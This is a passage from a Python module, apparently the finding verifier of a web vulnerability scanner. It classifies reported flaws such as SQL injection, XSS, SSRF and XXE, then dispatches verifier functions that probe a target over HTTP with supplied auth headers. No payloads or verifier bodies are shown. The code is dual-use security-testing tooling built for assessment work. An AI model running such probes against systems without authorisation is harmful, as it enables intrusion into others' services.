    if 'sql injection' in t:                          return 'sqli_error'
    if 'stored xss' in t:                             return 'xss_stored'
    if 'dom xss' in t or 'dom-based xss' in t:        return 'xss_dom'
    if 'xss' in t:                                    return 'xss_reflected'
    if 'ssti' in t or 'template injection' in t:      return 'ssti'
    if 'traversal' in t:                              return 'traversal'
    if 'command injection' in t:                      return 'cmdi'
    if 'open redirect' in t or ('redirect' in t and 'open' in t): return 'redirect'
    if 'ssrf' in t:                                   return 'ssrf'
    if 'xxe' in t:                                    return 'xxe'
    if 'cors' in t:                                   return 'cors'
    if 'host header' in t:                            return 'host_header'
    if 'auth bypass' in t:                            return 'auth_bypass'
    if 'csrf' in t:                                   return 'csrf'
    if 'security header' in t:                        return 'sec_headers'
    if 'sensitive file' in t:                         return 'sensitive_file'
    if 'info' in t and 'disclos' in t:                return 'info_disclosure'
    if 'verb' in t and 'tamper' in t:                 return 'verb_tamper'
    return 'generic'


_VERIFIERS = {
    'sqli_error':      _v_sqli_error,
    'sqli_bool':       _v_sqli_bool,
    'sqli_time':       _v_sqli_time,
    'xss_reflected':   _v_xss_reflected,
    'xss_stored':      _v_xss_reflected,
    'xss_dom':         _v_xss_dom,
    'ssti':            _v_ssti,
    'traversal':       _v_traversal,
    'cmdi':            _v_cmdi,
    'redirect':        _v_redirect,
    'ssrf':            _v_ssrf,
    'xxe':             _v_xxe,
    'cors':            _v_cors,
    'host_header':     _v_host_header,
    'auth_bypass':     _v_auth_bypass,
    'csrf':            _v_csrf,
    'sec_headers':     _v_sec_headers,
    'sensitive_file':  _v_sensitive_file,
    'info_disclosure': _v_info_disclosure,
    'verb_tamper':     _v_verb_tamper,
    'file_upload':     _v_file_upload,
    'xpath':           _v_xpath,
    'second_order':    _v_second_order,
    'h2_desync':       _v_h2_desync,
    'saml':            _v_saml,
    # OWASP gap modules
    'ldap':            _v_ldap,
    'padding_oracle':  _v_padding_oracle,
    'cloud_storage':   _v_cloud_storage,
    'ssi':             _v_ssi,
    'format_string':   _v_format_string,
    'email_inject':    _v_generic,
    'css_inject':      _v_generic,
    'xssi':            _v_xssi,
    'web_messaging':   _v_generic,
    'js_exec':         _v_generic,
    'weak_crypto':     _v_weak_crypto,
    'session_mgmt':    _v_session_check,
    'browser_cache':   _v_cache_check,
    'sec_question':    _v_generic,
    'alt_channel':     _v_generic,
    'generic':         _v_generic,
}


async def verify_finding(finding: Dict, http: aiohttp.ClientSession) -> Dict:
    """Verify one finding. Returns a proof dict."""
    url = finding.get('endpoint', '')
    if not url:
        return _proof_unconfirmed(finding, 'No endpoint in finding')
    bl   = await _baseline(http, url)
    kind = _classify(finding)
    fn   = _VERIFIERS.get(kind, _v_generic)
    try:
        result = await fn(finding, http, bl)
    except Exception as exc:
        logger.warning('[Verifier] %s verifier failed: %s', kind, exc)
        result = _proof_unconfirmed(finding, f'Verifier error: {exc}')
    result['vuln_class']      = kind
    result['original_finding'] = finding
    return result


# ── Runner ────────────────────────────────────────────────────────────────────

async def _scan(vsid: str) -> None:
    with _lock:
        s = _sessions.get(vsid)
        if not s:
            return
        cfg      = dict(s)
        findings = list(s['findings'])

    base_headers = {'User-Agent': 'DS1Hunter-Verifier/1.0'}
    if cfg.get('auth_header'):
        ah = cfg['auth_header']
        if ':' in ah:
            k, _, v = ah.partition(':')
            base_headers[k.strip()] = v.strip()
        else:
            base_headers['Authorization'] = ah
    base_headers.update(cfg.get('extra_headers') or {})

    tgt_host  = urlparse(cfg['url']).hostname or ''
    connector = scan_proxy.make_connector(limit=4, target_host=tgt_host)
    timeout   = aiohttp.ClientTimeout(total=12)

    async with aiohttp.ClientSession(connector=connector, timeout=timeout, headers=base_headers) as http:
        for i, finding in enumerate(findings):
            with _lock:
                s = _sessions.get(vsid)
                if s and s.get('_stop'):
                    break
            _set(vsid, current_title=finding.get('title', '')[:60])
            try:
                result = await verify_finding(finding, http)
            except Exception as exc:
                result = _proof_unconfirmed(finding, str(exc))
            result['finding_idx'] = i
            with _lock:
                s = _sessions.get(vsid)
                if s:
                    s['results'].append(result)
                    s['verified'] += 1
                    key = result.get('status', 'unconfirmed')
                    s['summary'][key] = s['summary'].get(key, 0) + 1
            await asyncio.sleep(0.2)

    _set(vsid, current_title='')


def _run(vsid: str) -> None:
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(_scan(vsid))
    except Exception as exc:
        _set(vsid, error=str(exc))
        logger.exception('[Verifier] %s unhandled error', vsid)
    finally:
        loop.close()
    snapshot = None
    with _lock:
        s = _sessions.get(vsid)
        if s:
            s['running']     = False
            s['done']        = True
            s['finished_at'] = time.time()
            snapshot = {k: v for k, v in s.items() if k not in _INTERNAL_KEYS}
    if snapshot:
        try:
            _store_save(_MODULE, vsid, snapshot)
        except Exception:
            pass
